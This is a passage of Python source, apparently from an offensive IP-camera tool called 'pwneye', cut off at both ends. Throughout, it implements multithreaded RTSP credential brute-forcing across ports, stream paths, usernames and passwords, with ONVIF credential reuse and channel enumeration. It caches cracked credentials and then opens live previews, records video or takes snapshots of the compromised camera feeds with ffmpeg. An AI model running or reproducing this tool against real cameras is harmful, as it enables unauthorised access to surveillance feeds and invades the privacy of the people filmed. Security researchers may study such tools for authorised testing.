        attempt = _build_rtsp_channel_attempt(base_attempt, template, channel)
        result = _probe_rtsp_attempt(attempt, timeout=args.timeout)
        if result.stream_available:
            accepted += 1
        elif result.status_code in (400, 404) and result.error is None:
            rejected += 1
        if accepted >= 2:
            tui.warning(
                "The device may be ignoring the channel identifier. Additional channels could be "
                "aliases of the same stream"
            )
            return tui.confirm("Continue channel enumeration anyway?", default=False)
    if rejected >= 2 and not accepted:
        tui.info2("The target appears to support RTSP channel enumeration")
    else:
        tui.warning("Channel enumeration support could not be confirmed. Continuing with the existing enumeration method")
    return True


def _discover_rtsp_channels(
    base_attempt: RtspAttempt,
    args: argparse.Namespace,
    tui: TUI,
) -> tuple[list[RtspChannelEntry], bool]:
    """
    Enumerate additional RTSP channels from a validated channel-based template.
    """
    extracted = _extract_rtsp_channel_template(base_attempt.path)
    if extracted is None:
        return [RtspChannelEntry(channel=1, attempt=base_attempt)], False

    channel_template, initial_channel = extracted
    discovered: dict[int, RtspChannelEntry] = {
        initial_channel: RtspChannelEntry(channel=initial_channel, attempt=base_attempt)
    }
    try:
        if not _check_rtsp_channel_enumeration(base_attempt, channel_template, initial_channel, args, tui):
            return list(discovered.values()), False
    except KeyboardInterrupt:
        tui.info("Stopping channel enumeration and using the validated stream")
        return list(discovered.values()), True
    tested = {initial_channel}

    def try_channel(channel: int) -> bool:
        if channel in tested or channel <= 0:
            return False

        tested.add(channel)
        attempt = _build_rtsp_channel_attempt(base_attempt, channel_template, channel)
        tui.update_live(f"Trying channel {channel}: {attempt.url}")

        result = _probe_rtsp_attempt(
            attempt,
            timeout=args.timeout,
        )
        if result.stream_available:
            discovered[channel] = RtspChannelEntry(channel=channel, attempt=attempt)
            tui.success("RTSP channel {channel} is valid", channel=channel)
            return True

        return False

    def follow_up_from(channel: int) -> None:
        consecutive_failures = 0
        next_channel = channel + 1

        while consecutive_failures < 3:
            if try_channel(next_channel):
                consecutive_failures = 0
            else:
                consecutive_failures += 1
            next_channel += 1

    initial_waves = [
        [1, 2, 3, 4],
        [5, 6, 7, 8],
        list(range(9, 17)),
        [101, 102, 103, 104],
        [201, 202, 203, 204],
    ]

    tui.info("Enumerating RTSP channels using the validated connection template...")
    tui.info("Press CTRL-C to stop channel enumeration and choose from the channels found")
    tui.start_live("Enumerating RTSP channels...")
    tui.success("RTSP channel {channel} is valid", channel=initial_channel)

    next_candidates = {
        "low": 17,
        "mid": 105,
        "high": 205,
    }
    interrupted = False

    try:
        for wave in initial_waves:
            for channel in wave:
                if try_channel(channel):
                    follow_up_from(channel)

        if any(channel < 100 for channel in discovered):
            next_candidates["low"] = max(channel for channel in discovered if channel < 100) + 1
        else:
            next_candidates["low"] = None

        if any(100 <= channel < 200 for channel in discovered):
            next_candidates["mid"] = max(channel for channel in discovered if 100 <= channel < 200) + 1
        else:
            next_candidates["mid"] = None

        if any(200 <= channel < 300 for channel in discovered):
            next_candidates["high"] = max(channel for channel in discovered if 200 <= channel < 300) + 1
        else:
            next_candidates["high"] = None

        while any(value is not None for value in next_candidates.values()):
            for family in ("low", "mid", "high"):
                candidate = next_candidates[family]
                if candidate is None:
                    continue

                if try_channel(candidate):
                    follow_up_from(candidate)

                next_candidates[family] = candidate + 1
    except KeyboardInterrupt:
        interrupted = True
        tui.console.file.write("\r\033[2K")
        tui.console.file.flush()
        tui.info("Stopping RTSP channel enumeration and using the channels discovered so far")
    finally:
        tui.stop_live()

    if len(discovered) == 1:
        tui.info("No additional RTSP channels were discovered")

    return [
        discovered[channel]
        for channel in sorted(discovered)
    ], interrupted

def _maybe_select_rtsp_channel(
    attempt: RtspAttempt,
    args: argparse.Namespace,
    tui: TUI,
    *,
    allow_open_all: bool = False,
) -> tuple[RtspAttempt | None, list[RtspChannelEntry] | None]:
    """
    Optionally enumerate and select a specific RTSP channel from a multi-channel template.
    """
    extracted = _extract_rtsp_channel_template(attempt.path)
    if extracted is None:
        return attempt, None

    if not args.no_cache and not args.fresh:
        cached_entries = _build_cached_rtsp_channel_entries(
            attempt,
            cachedata.get_cached_rtsp_channels(cachedata.load_target(args.target)),
        )
        if cached_entries:
            tui.info2("Using previously cached RTSP channel enumeration")
            tui.info("Run the tool again with --fresh to re-enumerate the RTSP channels")

            if len(cached_entries) == 1:
                return cached_entries[0].attempt, cached_entries

            if args.no_video and args.snapshot is None and args.record is None:
                return cached_entries[0].attempt, cached_entries

            selected = tui.select_channel(
                cached_entries,
                prompt=RTSP_CHANNEL_SELECT_PROMPT,
                extra_option=RTSP_OPEN_ALL_CHANNELS_OPTION if allow_open_all else None,
            )
            return None if selected is None else selected.attempt, cached_entries

    if not tui.confirm(
        "This RTSP stream may support multiple channels. Try to enumerate them?",
        default=True,
    ):
        return attempt, None

    channels, interrupted = _discover_rtsp_channels(attempt, args, tui)
    _persist_rtsp_channels(args, channels, tui)

    if interrupted and args.no_video and args.record is None and args.snapshot is None:
        tui.interrupted()
        raise KeyboardInterrupt

    if len(channels) == 1:
        return channels[0].attempt, channels

    if args.no_video and args.snapshot is None and args.record is None:
        return channels[0].attempt, channels

    selected = tui.select_channel(
        channels,
        prompt=RTSP_CHANNEL_SELECT_PROMPT,
        extra_option=RTSP_OPEN_ALL_CHANNELS_OPTION if allow_open_all else None,
    )
    return None if selected is None else selected.attempt, channels

def _build_rtsp_attempts(
    host: str,
    ports: list[int],
    paths: list[str],
    usernames: list[str],
    passwords: list[str],
    protocol: str,
) -> list[RtspAttempt]:
    """
    Build and de-duplicate RTSP bruteforce attempts.
    """
    attempts: list[RtspAttempt] = []
    seen: set[tuple[int, str, str, str]] = set()

    for port in ports:
        for username in usernames:
            for password in passwords:
                for raw_path in paths:
                    for path in _expand_rtsp_path(raw_path):
                        key = (port, path, username, password)
                        if key in seen:
                            continue

                        seen.add(key)
                        url = rtsp.build_rtsp_url(
                            host=host,
                            port=port,
                            path=path,
                            username=username,
                            password=password,
                            use_tcp=protocol == "tcp",
                        )
                        attempts.append(
                            RtspAttempt(
                                host=host,
                                port=port,
                                path=path,
                                username=username,
                                password=password,
                                protocol=protocol,
                                url=url,
                            )
                        )

    return attempts

def _prioritize_onvif_rtsp_attempts(
    attempts: list[RtspAttempt],
    onvif_credentials: tuple[str, str] | None,
) -> list[RtspAttempt]:
    """
    Prioritize the exact ONVIF credential pair across all RTSP paths and ports.
    """
    if onvif_credentials is None:
        return attempts

    username, password = onvif_credentials
    prioritized = []
    remaining = []

    for attempt in attempts:
        if attempt.username == username and attempt.password == password:
            prioritized.append(attempt)
        else:
            remaining.append(attempt)

    return prioritized + remaining


def _try_cached_rtsp_auth(
    args: argparse.Namespace,
    cache_entry: dict | None,
    onvif_credentials: tuple[str, str] | None,
    tui: TUI,
) -> bool:
    """
    Try a previously cached RTSP credential and stream before running a fresh scan.
    """
    if args.no_cache or args.fresh or args.username is not None or args.password is not None or args.connection_string:
        return False

    cached_rtsp = cachedata.get_cached_rtsp_auth(cache_entry)
    if cached_rtsp is None:
        return False

    tui.info("Trying cached RTSP credentials for the target...")

    attempt = RtspAttempt(
        host=args.target,
        port=cached_rtsp["port"],
        path=cached_rtsp["path"],
        username=cached_rtsp["username"],
        password=cached_rtsp["password"],
        protocol=cached_rtsp["protocol"],
        url=cached_rtsp["url"],
    )

    tui.start_live(_format_attempt_label(attempt))
    try:
        result = rtsp.probe_rtsp_url(
            attempt.url,
            timeout=args.timeout,
        )

        if (
            (attempt.username or attempt.password)
            and not result.stream_available
            and (
                result.status_code == 401
                or result.error is not None
            )
        ):
            result = rtsp.probe_rtsp_url_with_ffprobe(
                attempt.url,
                protocol=attempt.protocol,
                timeout=args.timeout,
            )
    finally:
        tui.stop_live()

    if not result.stream_available:
        tui.warning("Cached RTSP credentials are no longer valid")
        return False

    tui.success("Working RTSP stream discovered from cache")
    tui.block({
        "URL": attempt.url,
        "Protocol": attempt.protocol,
        "Username": attempt.username,
        "Password": attempt.password,
        "Status": f"{result.status_code} {result.reason}".strip(),
        "Auth": result.auth_scheme or "none",
    })

    _handle_rtsp_stream(
        attempt,
        args,
        tui,
        onvif_credentials=onvif_credentials,
        warn_rtsp_instability=False,
    )
    return True

def _format_attempt_label(attempt: RtspAttempt) -> str:
    """
    Format a one-line label for live brute-force output.
    """
    return f"Trying {attempt.url}"

def _run_rtsp_bruteforce(
    attempts: list[RtspAttempt],
    timeout: int,
    threads: int,
    ffprobe_fallback: bool,
    tui: TUI,
) -> tuple[RtspAttempt | None, RtspProbeResult | None]:
    """
    Run the RTSP bruteforce loop using a bounded worker pool.
    """
    task_queue: queue.Queue[RtspAttempt] = queue.Queue()
    stop_event = threading.Event()
    state_lock = threading.Lock()
    workers: list[threading.Thread] = []

    success_attempt: RtspAttempt | None = None
    success_result: RtspProbeResult | None = None
    stats = {
        "attempted": 0,
        "auth_failed": 0,
        "invalid_path": 0,
        "errors": 0,
    }

    for attempt in attempts:
        task_queue.put(attempt)

    tui.start_live("Preparing RTSP bruteforce...")
    try:
        def worker() -> None:
            nonlocal success_attempt, success_result

            while not stop_event.is_set():
                try:
                    attempt = task_queue.get_nowait()
                except queue.Empty:
                    return

                try:
                    with state_lock:
                        tui.update_attempt_progress(stats["attempted"], len(attempts), _format_attempt_label(attempt))

                    result = rtsp.probe_rtsp_url(
                        attempt.url,
                        timeout=timeout,
                        stop_event=stop_event,
                    )

                    if (
                        ffprobe_fallback
                        and (attempt.username or attempt.password)
                        and not result.stream_available
                        and (
                            result.status_code == 401
                            or result.error is not None
                        )
                    ):
                        result = rtsp.probe_rtsp_url_with_ffprobe(
                            attempt.url,
                            protocol=attempt.protocol,
                            timeout=timeout,
                        )

                    with state_lock:
                        stats["attempted"] += 1

                        if result.stream_available and success_attempt is None:
                            success_attempt = attempt
                            success_result = result
                            stop_event.set()
                        elif result.status_code == 401:
                            stats["auth_failed"] += 1
                        elif result.credentials_valid and not result.path_valid:
                            stats["invalid_path"] += 1
                        elif result.error:
                            stats["errors"] += 1
                        tui.update_attempt_progress(stats["attempted"], len(attempts), _format_attempt_label(attempt))

                except InterruptedError:
                    return
                except Exception:
                    with state_lock:
                        stats["attempted"] += 1
                        stats["errors"] += 1
                        tui.update_attempt_progress(stats["attempted"], len(attempts), _format_attempt_label(attempt))
                finally:
                    task_queue.task_done()

        worker_count = max(1, min(threads, len(attempts)))
        workers = [
            threading.Thread(target=worker, daemon=False)
            for _ in range(worker_count)
        ]

        for thread in workers:
            thread.start()

        for thread in workers:
            thread.join()

    except KeyboardInterrupt:
        stop_event.set()
        for thread in workers:
            thread.join()
        raise
    finally:
        tui.stop_live()

    tui.info2(
        "RTSP bruteforce completed after {attempted} attempt(s)",
        attempted=stats["attempted"],
    )
    tui.block({
        "Auth failed": stats["auth_failed"],
        "Invalid path": stats["invalid_path"],
        "Errors": stats["errors"],
    })

    return success_attempt, success_result

def _run_rtsp_scan(
    args: argparse.Namespace,
    rtsp_kb: dict,
    rtsp_ports: list[int],
    onvif_streams: list[str],
    manufacturer: str | None,
    onvif_credentials: tuple[str, str] | None,
    tui: TUI,
) -> bool:
    """
    Complete RTSP scanning workflow.
    """
    valid_onvif_streams = _filter_onvif_rtsp_streams_by_valid_port(
        host=args.target,
        streams=onvif_streams,
        tui=tui,
        validated_ports=rtsp_ports,
        timeout=args.rtsp_port_timeout,
    ) if onvif_streams else []
    provided_connection_strings = bool(_resolve_connection_string_values(args.connection_string))

    cached_manufacturer = None
    if not args.no_cache and not args.fresh:
        cached_manufacturer = cachedata.get_cached_onvif_manufacturer(cachedata.load_target(args.target))

    vendor = args.vendor or manufacturer or cached_manufacturer
    if args.vendor:
        tui.info2("RTSP vendor selected: {vendor}", vendor=vendor)
    elif manufacturer:
        tui.info2("RTSP vendor inferred from ONVIF: {vendor}", vendor=vendor)
    elif cached_manufacturer:
        tui.info2("RTSP vendor loaded from cache: {vendor}", vendor=vendor)
    elif provided_connection_strings:
        vendor = None
    else:
        vendor = _detect_rtsp_vendor(args.target, rtsp_ports, rtsp_kb, tui, no_cache=args.no_cache)

    fixed_rtsp_credentials = args.username is not None and args.password is not None
    if fixed_rtsp_credentials:
        tui.info(
            "Loading user-provided RTSP username(s) and password(s)..."
        )
    elif args.username is not None:
        tui.info(
            "Loading user-provided RTSP username(s)..."
        )
    elif args.password is not None:
        tui.info(
            "Loading user-provided RTSP password(s)..."
        )

    ports, usernames, passwords, paths, exhaustive_paths = _resolve_rtsp_targets(
        args=args,
        rtsp_kb=rtsp_kb,
        ports=rtsp_ports,
        manufacturer=vendor,
        rtsp_streams=valid_onvif_streams,
        onvif_credentials=onvif_credentials,
    )

    attempts = _build_rtsp_attempts(
        host=args.target,
        ports=ports,
        paths=paths,
        usernames=usernames,
        passwords=passwords,
        protocol=args.protocol,
    )
    attempts = _prioritize_onvif_rtsp_attempts(
        attempts,
        onvif_credentials,
    )

    if not attempts:
        tui.error("No RTSP attempts could be generated from the current context")
        return False

    thread_count = max(1, min(args.threads, len(attempts)))

    if exhaustive_paths:
        if not _confirm_exhaustive_rtsp_scan(
            tui=tui,
            attempts=len(attempts),
            ports=len(ports),
            paths=len(paths),
            threads=thread_count,
            vendor_identified=False,
        ):
            tui.info("Skipping exhaustive RTSP path scan at user request")
            return False

    if len(attempts) > 5000:
        tui.warning(
            "This RTSP scan will generate a large number of requests. Consider specifying at least a username to reduce the number of attempts"
        )

    message = (
        "Trying {attempts} RTSP combination(s) using user-provided connection string(s) across {ports} port(s), {paths} path(s) and {threads} thread(s)..."
        if provided_connection_strings
        else "Trying {attempts} RTSP combination(s) using generic path(s) across {ports} port(s), {paths} path(s) and {threads} thread(s)..."
        if vendor is None and not exhaustive_paths
        else "Trying {attempts} RTSP combination(s) across {ports} port(s), {paths} path(s) and {threads} thread(s)..."
    )
    tui.info(
        message,
        attempts=len(attempts),
        ports=len(ports),
        paths=len(paths),
        threads=thread_count,
    )

    match, result = _run_rtsp_bruteforce(
        attempts=attempts,
        timeout=args.timeout,
        threads=args.threads,
        ffprobe_fallback=True,
        tui=tui,
    )

    if match is None or result is None:
        if not provided_connection_strings and not exhaustive_paths and _should_offer_exhaustive_rtsp_scan(args, vendor):
            fallback_ports, fallback_usernames, fallback_passwords, fallback_paths, _ = _resolve_rtsp_targets(
                args=args,
                rtsp_kb=rtsp_kb,
                ports=rtsp_ports,
                manufacturer=None,
                rtsp_streams=valid_onvif_streams,
                onvif_credentials=onvif_credentials,
                vendor_override="",
                use_exhaustive_paths=True,
            )

            fallback_attempts = _build_rtsp_attempts(
                host=args.target,
                ports=fallback_ports,
                paths=fallback_paths,
                usernames=fallback_usernames,
                passwords=fallback_passwords,
                protocol=args.protocol,
            )
            fallback_attempts = _prioritize_onvif_rtsp_attempts(
                fallback_attempts,
                onvif_credentials,
            )

            if fallback_attempts:
                fallback_thread_count = max(1, min(args.threads, len(fallback_attempts)))

                if _confirm_exhaustive_rtsp_scan(
                    tui=tui,
                    attempts=len(fallback_attempts),
                    ports=len(fallback_ports),
                    paths=len(fallback_paths),
                    threads=fallback_thread_count,
                    vendor_identified=bool(vendor),
                ):
                    tui.info(
                        "Trying {attempts} RTSP combination(s) across {ports} port(s), {paths} path(s) and {threads} thread(s)...",
                        attempts=len(fallback_attempts),
                        ports=len(fallback_ports),
                        paths=len(fallback_paths),
                        threads=fallback_thread_count,
                    )

                    match, result = _run_rtsp_bruteforce(
                        attempts=fallback_attempts,
                        timeout=args.timeout,
                        threads=args.threads,
                        ffprobe_fallback=True,
                        tui=tui,
                    )

        if match is None or result is None:
            if fixed_rtsp_credentials:
                tui.warning(
                    "Unable to validate the user-provided RTSP credentials. "
                    "Try running the tool again without --username and --password "
                    "to test common RTSP credentials."
                )
                return False

            tui.warning("Unable to identify a working RTSP stream")
            tui.info(_build_rtsp_failure_hint(args))
            return False

    tui.success("Working RTSP stream discovered")
    tui.block({
        "URL": match.url,
        "Protocol": match.protocol,
        "Username": match.username,
        "Password": match.password,
        "Status": f"{result.status_code} {result.reason}".strip(),
        "Auth": result.auth_scheme or "none",
    })

    if not args.no_cache:
        cachedata.upsert_rtsp_success(
            args.target,
            port=match.port,
            username=match.username,
            password=match.password,
            path=match.path,
            protocol=match.protocol,
            url=match.url,
        )
        tui.info2("Saved RTSP credentials to cache")

    _handle_rtsp_stream(
        match,
        args,
        tui,
        onvif_credentials=onvif_credentials,
    )

    return True

def _build_rtsp_failure_hint(args: argparse.Namespace) -> str:
    """
    Build a short, actionable hint after an RTSP failure.
    """
    if args.connection_string:
        return (
            "Check that the user-provided connection string is correct, or try a different "
            "RTSP path / vendor profile."
        )

    if args.vendor:
        return (
            "Try running the tool again without --vendor, or specify a different vendor "
            "if the target does not match the selected RTSP profile."
        )

    if args.multi_channel:
        return (
            "Try a different multi-channel RTSP connection string, or rerun without "
            "--multi-channel if the target also exposes a generic stream path."
        )

    return (
        "Try specifying --vendor or --connection-string, or rerun the tool with different "
        "credentials if you already know them."
    )

def _should_offer_exhaustive_rtsp_scan(
    args: argparse.Namespace,
    vendor: str | None,
) -> bool:
    """
    Return True if an exhaustive RTSP fallback should be proposed.
    """
    return True

def _confirm_exhaustive_rtsp_scan(
    tui: TUI,
    attempts: int,
    ports: int,
    paths: int,
    threads: int,
    vendor_identified: bool,
) -> bool:
    """
    Warn the user and ask whether to run an exhaustive RTSP path scan.
    """
    if vendor_identified:
        tui.warning("The vendor-specific RTSP paths did not produce a working stream")
    else:
        tui.warning("Unable to identify the RTSP vendor via banner")
        tui.warning(
            "Specifying the RTSP vendor would reduce the number of requests significantly"
        )

    return tui.confirm(
        f"Try an exhaustive RTSP path scan with {attempts} combination(s) across "
        f"{ports} port(s), {paths} path(s) and {threads} thread(s)?",
        default=False,
    )

def _warn_before_rtsp_stream(
    tui: TUI,
    onvif_credentials: tuple[str, str] | None,
) -> None:
    """
    Warn the user that RTSP bruteforce activity may have destabilized the target.
    """
    tui.warning(
        "RTSP bruteforce activity may have made the camera unstable. "
        "If the live stream does not load immediately, the device may need a moment to recover"
    )

def _build_ffmpeg_capture_cmd(
    attempt: RtspAttempt,
    temp_path: Path,
) -> list[str]:
    """
    Build the ffmpeg command used to capture an RTSP stream to a tolerant container.
    """
    return [
        "ffmpeg",
        "-nostats",
        "-loglevel", "error",
        "-rtsp_transport", attempt.protocol,
        "-analyzeduration", "10M",
        "-probesize", "10M",
        "-y",
        "-i", attempt.url,
        "-map", "0:v:0",
        "-map", "0:a:0?",
        "-c", "copy",
        "-f", "matroska",
        str(temp_path),
    ]

def _build_ffmpeg_finalize_cmd(
    temp_path: Path,
    output_path: Path,
    mode: str = "copy",
) -> list[str]:
    """
    Build the ffmpeg command used to finalize the temporary recording into MP4.
    """
    cmd = [
        "ffmpeg",
        "-nostats",
        "-loglevel", "error",
        "-y",
        "-i", str(temp_path),
    ]

    if mode == "copy":
        cmd.extend([
            "-map", "0:v:0",
            "-map", "0:a:0?",
            "-c", "copy",
            "-movflags", "+faststart",
        ])
    elif mode == "transcode":
        cmd.extend([
            "-map", "0:v:0",
            "-map", "0:a:0?",
            "-c:v", "libx264",
            "-preset", "ultrafast",
            "-pix_fmt", "yuv420p",
            "-c:a", "aac",
            "-movflags", "+faststart",
        ])
    elif mode == "video_only_transcode":
        cmd.extend([
            "-map", "0:v:0",
            "-an",
            "-c:v", "libx264",
            "-preset", "ultrafast",
            "-pix_fmt", "yuv420p",
            "-movflags", "+faststart",
        ])
    else:
        raise ValueError(f"Unsupported ffmpeg finalize mode: {mode}")

    cmd.append(str(output_path))
    return cmd

def _build_ffplay_cmd(attempt: RtspAttempt) -> list[str]:
    """
    Build the ffplay command used for live preview.
    """
    return [
        "ffplay",
        "-loglevel", "quiet",
        "-rtsp_transport", attempt.protocol,
        "-fflags", "nobuffer",
        "-flags", "low_delay",
        "-i", attempt.url,
    ]

def _launch_ffplay_preview(attempt: RtspAttempt) -> tuple[bool, str | None]:
    """
    Launch ffplay in the background and return quickly to the CLI.
    """
    stderr_path = Path(
        tempfile.mkstemp(prefix="pwneye-ffplay-", suffix=".log")[1]
    )
    stderr_handle = stderr_path.open("w", encoding="utf-8")
    try:
        process = subprocess.Popen(
            _build_ffplay_cmd(attempt),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=stderr_handle,
            start_new_session=True,
        )
    finally:
        stderr_handle.close()

    time.sleep(0.8)
    exit_code = process.poll()
    if exit_code is None:
        stderr_path.unlink(missing_ok=True)
        return True, None

    detail = _read_process_error(stderr_path)
    stderr_path.unlink(missing_ok=True)
    return False, detail or "ffplay exited unexpectedly"

def _resolve_viewer_onvif_context(
    args: argparse.Namespace,
    onvif_credentials: tuple[str, str] | None = None,
) -> ViewerOnvifContext | None:
    """
    Return an ONVIF PTZ context for the dedicated viewer when valid auth exists.
    """
    resolved_port = getattr(args, "_resolved_onvif_port", None)
    if resolved_port is not None and onvif_credentials is not None:
        username, password = onvif_credentials
        return onvif.build_ptz_viewer_context(
            host=args.target,
            port=int(resolved_port),
            username=str(username),
            password=str(password),
        )

    cache_entry = cachedata.load_target(args.target)
    cached_onvif_auth = cachedata.get_cached_onvif_auth(cache_entry)
    if cached_onvif_auth is None:
        return None

    return onvif.build_ptz_viewer_context(
        host=args.target,
        port=int(cached_onvif_auth["port"]),
        username=str(cached_onvif_auth["username"]),
        password=str(cached_onvif_auth["password"]),
    )

def _terminate_process(proc: subprocess.Popen | None) -> int | None:
    """
    Terminate a subprocess gracefully, then force kill if needed.
    """
    if proc is None or proc.poll() is not None:
        return None if proc is None else proc.returncode

    proc.terminate()

    try:
        return proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
        return proc.wait()

def _stop_ffmpeg_recording(recorder: subprocess.Popen | None) -> int | None:
    """
    Ask ffmpeg to stop gracefully so the output container can be finalized.
    """
    if recorder is None or recorder.poll() is not None:
        return None if recorder is None else recorder.returncode

    try:
        if recorder.stdin is not None:
            recorder.stdin.write(b"q\n")
            recorder.stdin.flush()
            return recorder.wait(timeout=5)
    except (BrokenPipeError, OSError, subprocess.TimeoutExpired):
        pass

    return _terminate_process(recorder)

def _get_file_size_mb(path: Path) -> float:
    """
    Return the file size in megabytes.
    """
    return path.stat().st_size / (1024 * 1024)

def _read_process_error(log_path: Path) -> str | None:
    """
    Return the most relevant error line captured from a process stderr log.
    """
    if not log_path.exists():
        return None

    try:
        with log_path.open("r", encoding="utf-8", errors="ignore") as handle:
            lines = [line.strip() for line in handle if line.strip()]
    except OSError:
        return None

    if not lines:
        return None

    return lines[-1]

def _read_process_log(log_path: Path) -> str:
    """
    Return the full stderr log captured from a process.
    """
    if not log_path.exists():
        return ""

    try:
        return log_path.read_text(encoding="utf-8", errors="ignore")
    except OSError:
        return ""

def _start_ffmpeg_process(
    cmd: list[str],
    stderr_path: Path,
) -> subprocess.Popen:
    """
    Start an ffmpeg process and redirect stderr to a temporary log file.
    """
    stderr_handle = stderr_path.open("w", encoding="utf-8")
    try:
        return subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=stderr_handle,
        )
    finally:
        stderr_handle.close()

def _build_temp_recording_path(output_path: Path) -> Path:
    """
    Build the temporary recording path used during capture.
    """
    return output_path.with_suffix(".capture.mkv")

def _start_ffmpeg_capture(
    attempt: RtspAttempt,
    temp_path: Path,
    stderr_path: Path,
) -> subprocess.Popen:
    """
    Start ffmpeg capture to a temporary file.
    """
    return _start_ffmpeg_process(
        _build_ffmpeg_capture_cmd(attempt, temp_path),
        stderr_path,
    )

def _build_ffmpeg_snapshot_cmd(
    attempt: RtspAttempt,
    output_path: Path,
) -> list[str]:
    """
    Build the ffmpeg command used to capture a single snapshot from an RTSP stream.
    """
    return [
        "ffmpeg",
        "-nostats",
        "-hide_banner",
        "-loglevel",
        "error",
        "-rtsp_transport",
        attempt.protocol,
        "-timeout",
        "10000000",
        "-i",
        attempt.url,
        "-map",
        "0:v:0",
        "-frames:v",
        "1",
        "-q:v",
        "2",
        "-y",
        str(output_path),
    ]

def _finalize_recording_to_mp4(
    temp_path: Path,
    output_path: Path,
    tui: TUI,
) -> str | None:
    """
    Convert a temporary recording into the final MP4 file.

    Returns:
        None on success, or a human-readable error detail on failure.
    """
    if not temp_path.exists() or temp_path.stat().st_size == 0:
        return "no temporary recording was produced"

    attempts = [
        ("copy", None),
        ("transcode", "Retrying MP4 finalization in compatibility mode (transcoding)..."),
        ("video_only_transcode", "Retrying MP4 finalization in compatibility mode (video-only transcoding)..."),
    ]

    last_error = None

    for mode, retry_message in attempts:
        if retry_message:
            tui.warning(retry_message)

        stderr_path = Path(tempfile.mkstemp(prefix="pwneye-ffmpeg-finalize-", suffix=".log")[1])
        try:
            with stderr_path.open("w", encoding="utf-8") as stderr_handle:
                result = subprocess.run(
                    _build_ffmpeg_finalize_cmd(temp_path, output_path, mode=mode),
                    stdout=subprocess.DEVNULL,
                    stderr=stderr_handle,
                )
        except OSError:
            result = subprocess.CompletedProcess(args=[], returncode=1)

        try:
            if result.returncode == 0 and output_path.exists() and output_path.stat().st_size > 0:
                return None

            last_error = _read_process_error(stderr_path) or _read_process_log(stderr_path) or "unable to finalize MP4"
        finally:
            stderr_path.unlink(missing_ok=True)

    return last_error

def _report_saved_recording(output_path: Path, tui: TUI) -> None:
    """
    Print a success message for a saved recording.
    """
    if not output_path.exists():
        tui.warning("Recording stopped, but no output file was created")
        return

    size_mb = f"{_get_file_size_mb(output_path):.2f}"
    tui.success(
        "Recording saved to {path} ({size} MB)",
        path=output_path,
        size=size_mb,
    )

def _capture_rtsp_snapshot(attempt: RtspAttempt, args: argparse.Namespace, tui: TUI) -> None:
    """
    Capture a single snapshot from a valid RTSP stream using ffmpeg.
    """
    output_path, conflicting_path = resolve_snapshot_path_with_notice(args.snapshot, args.target)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    if conflicting_path is not None:
        tui.warning(
            "The snapshot file already exists at {path}",
            path=conflicting_path,
        )

    tui.info("Saving RTSP snapshot to {path}", path=output_path)

    stderr_path: Path | None = None

    try:
        stderr_path = Path(tempfile.mkstemp(prefix="pwneye-ffmpeg-snapshot-", suffix=".log")[1])

        with stderr_path.open("w", encoding="utf-8") as stderr_handle:
            result = subprocess.run(
                _build_ffmpeg_snapshot_cmd(attempt, output_path),
                stdout=subprocess.DEVNULL,
                stderr=stderr_handle,
            )

        if result.returncode == 0 and output_path.exists() and output_path.stat().st_size > 0:
            tui.success("Snapshot saved to {path}", path=output_path)
            return

        error_detail = _read_process_error(stderr_path) or _read_process_log(stderr_path)
        if error_detail:
            tui.error("Unable to capture the RTSP snapshot with ffmpeg ({detail})", detail=error_detail)
        else:
            tui.error("Unable to capture the RTSP snapshot with ffmpeg")
    except OSError:
        tui.error("Unable to capture the RTSP snapshot with ffmpeg")
    finally:
        if stderr_path is not None:
            stderr_path.unlink(missing_ok=True)

def _record_rtsp_stream(attempt: RtspAttempt, args: argparse.Namespace, tui: TUI) -> None:
    """
    Record a valid RTSP stream to disk using ffmpeg.
    """
    output_path, conflicting_path = resolve_recording_path_with_notice(args.record, args.target)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    temp_path = _build_temp_recording_path(output_path)

    if conflicting_path is not None:
        tui.warning(
            "The recording file already exists at {path}",
            path=conflicting_path,
        )

    tui.info("Recording RTSP stream to {path}", path=output_path)
    tui.info("Press CTRL-C to stop the recording")

    recorder: subprocess.Popen | None = None
    stderr_path: Path | None = None

    try:
        stderr_path = Path(tempfile.mkstemp(prefix="pwneye-ffmpeg-capture-", suffix=".log")[1])
        recorder = _start_ffmpeg_capture(attempt, temp_path, stderr_path)
        exit_code = recorder.wait()

        if exit_code == 0 or (temp_path.exists() and temp_path.stat().st_size > 0):
            finalize_error = _finalize_recording_to_mp4(temp_path, output_path, tui)
            if finalize_error is None:
                _report_saved_recording(output_path, tui)
            else:
                tui.error("Unable to finalize the recording to MP4 ({detail})", detail=finalize_error)
        else:
            error_detail = _read_process_error(stderr_path) if stderr_path else None
            if error_detail:
                tui.error("Unable to record the RTSP stream with ffmpeg ({detail})", detail=error_detail)
            else:
                tui.error("Unable to record the RTSP stream with ffmpeg")

    except KeyboardInterrupt:
        tui.console.file.write("\r\033[2K")
        tui.console.file.flush()
        exit_code = _stop_ffmpeg_recording(recorder)
        if exit_code in (0, 255, None) or (temp_path.exists() and temp_path.stat().st_size > 0):
            finalize_error = _finalize_recording_to_mp4(temp_path, output_path, tui)
            if finalize_error is None:
                _report_saved_recording(output_path, tui)
                return
            tui.error("Unable to finalize the recording to MP4 ({detail})", detail=finalize_error)
            return

        tui.error("Unable to finalize the recording cleanly")
    finally:
        if stderr_path is not None:
            stderr_path.unlink(missing_ok=True)
        temp_path.unlink(missing_ok=True)

def _play_rtsp_stream(
    attempt: RtspAttempt,
    args: argparse.Namespace,
    tui: TUI,
    *,
    onvif_credentials: tuple[str, str] | None = None,
    detach: bool = True,
) -> None:
    """
    Open a valid RTSP stream either in ffplay legacy mode or in the dedicated viewer.
    """
    del detach

    if args.legacy:
        tui.info("Opening live preview with ffplay...")
        opened, detail = _launch_ffplay_preview(attempt)
        if opened:
            return

        if detail:
            tui.error("Unable to open the RTSP stream with ffplay ({detail})", detail=detail)
        else:
            tui.error("Unable to open the RTSP stream with ffplay")
        return

    tui.info("Opening live preview in the dedicated client...")
    opened, detail = viewer.open_preview(
        [attempt],
        onvif_context=_resolve_viewer_onvif_context(args, onvif_credentials),
        launch_options=ViewerLaunchOptions(allow_recording=args.record is None),
    )

    if opened:
        return

    if detail:
        tui.error("Unable to open the live preview ({detail})", detail=detail)
    else:
        tui.error("Unable to open the live preview")

def _open_multichannel_viewer(
    args: argparse.Namespace,
    channels: list[RtspChannelEntry],
    tui: TUI,
    onvif_credentials: tuple[str, str] | None = None,
) -> None:
    """
